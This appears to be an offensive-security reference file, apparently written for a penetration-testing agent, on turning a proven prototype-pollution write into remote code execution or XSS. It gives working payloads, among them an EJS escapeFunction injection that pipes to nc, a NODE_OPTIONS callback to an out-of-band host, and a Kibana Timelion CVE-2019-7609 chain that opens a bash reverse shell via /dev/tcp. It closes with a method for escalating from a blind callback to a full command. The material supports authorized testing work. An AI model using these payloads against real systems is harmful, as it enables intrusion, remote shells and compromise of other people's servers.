# Prototype pollution gadgets — server-side RCE and client-side XSS chains — Open WHEN: the prototype write is already PROVEN and you need the second half of the chain (a code path that reads the polluted property and turns it into RCE, XSS, or config override)

A "gadget" is an existing code path in the app or a dependency that reads a property
off a plain object and does something dangerous with it. Prototype pollution plants
the property; the gadget reads it. You need BOTH halves: confirm the prototype write
first (see the body and `payloads.md`), then aim it at one of these gadgets.

The two listed Node tooling helpers find gadgets for you:
`yuske/server-side-prototype-pollution` (gadgets in Node core + popular npm packages)
and `BlackFan/client-side-prototype-pollution` (client-side script gadgets). Match
the polluted-property name those projects document to a library the target ships.

---

## Server-side (SSPP) — pollution-to-RCE gadgets

These only fire when a later code path reads the polluted property. Pollute the
property, then trigger the path (often just a second normal request).

### child_process spawn gadget (`shell` / `argv0` / `NODE_OPTIONS`)

When the app later spawns a child process with `child_process.spawn`/`exec` using an
options object built from a plain `{}`, the spawn inherits polluted options. Polluting
`NODE_OPTIONS` plus `shell`/`argv0` turns the next spawn into code execution. The
async test input (NodeJS):

```json
{
  "__proto__": {
    "argv0": "node",
    "shell": "node",
    "NODE_OPTIONS": "--inspect=test-marker\"\".oastify\"\".com"
  }
}
```

The `--inspect=<host>` value forces a DNS/HTTP lookup of `<host>` at spawn time, so a
DNS/HTTP back-channel hit on a unique subdomain confirms the gadget blind, before
escalating to a full command. Swap the marker host for your listener.

### EJS template gadget (`escapeFunction` / `client`)

EJS reads `escapeFunction` and `client` off its options object. Polluting them injects
JavaScript that runs at template-compile time — RCE in any app that renders an EJS
template after the prototype is polluted:

```json
{
  "__proto__": {
    "client": 1,
    "escapeFunction": "JSON.stringify; process.mainModule.require('child_process').exec('id | nc localhost 4444')"
  }
}
```

Replace `id | nc localhost 4444` with a back-channel command to your listener. Confirm
blind with a DNS/HTTP callback first (e.g. `curl http://<marker>.oast.tld`).

### Kibana Timelion gadget (CVE-2019-7609)

A named, documented chain: Kibana's Timelion expression reaches `__proto__.env` and,
with `NODE_OPTIONS=--require /proc/self/environ`, runs the JS planted in the process
environment. The two-line expression:

```js
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/<listener>/<port> 0>&1");process.exit()//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

Use only against a target whose recon fingerprints the vulnerable Kibana version;
replace `<listener>/<port>` with your back-channel endpoint.

### Generic SSPP impact short of RCE

Even without a spawn/template gadget, a polluted property can:

- **Override config defaults** — flip a feature flag, role, or `isAdmin`-style
  default that a later `if (opts.x)` reads off a plain object.
- **Change response behaviour** — the Express framework-internal tells in
  `payloads.md` (status, headers, parsing limits) are themselves impact when they
  alter security-relevant behaviour (e.g. exposing headers, weakening parsing).
- **Denial of service** — polluting a property the request path reads can wedge
  request handling. Avoid this on a shared target; note it as a finding rather than
  triggering it destructively.

---

## Client-side (CSPP) — pollution-to-XSS script gadgets

A script gadget is a library that reads a property off a plain object and writes it
into a DOM sink. Pollute the property via the URL hash/query (`payloads.md`), then the
gadget renders it. Co-dispatch `xss` for the execution context work.

Common script-gadget shapes to look for in the SPA bundle (the polluted property name
in brackets is what you set under `__proto__`):

- A library that reads `[src]` / `[onerror]` / `[srcdoc]` off an options object and
  injects it into an `<img>` / `<iframe>` — e.g. `__proto__[src]=image` plus
  `__proto__[onerror]=alert(1)`.
- A sanitizer whose allowlist/config is read off a plain object — pollution adds an
  allowed tag/attribute, bypassing the client-side HTML sanitizer.
- A template/templating helper that reads a property and writes it unescaped.

The wild URL shapes in `payloads.md` (the `apple.com` and `?src=image&onerror=alert(1)`
examples) are real CSPP-to-XSS gadget triggers — adapt the host/path to the target.

---

## Method: prove the write, then aim it

1. Confirm `({}).testpp` is set (prototype write proven).
2. Identify which library/code path on the target reads a property you can name.
3. Re-pollute with THAT property name set to a gadget value (a callback host first,
   then a command).
4. Trigger the reading path (usually a second normal request or a page render).
5. Observe the back-channel hit / DOM execution / overridden behaviour.

Always start a gadget with a blind DNS/HTTP callback (a unique marker host) so you
confirm the gadget fires before sending any command — the callback is the quiet
confirmation, the command is the proof of impact.
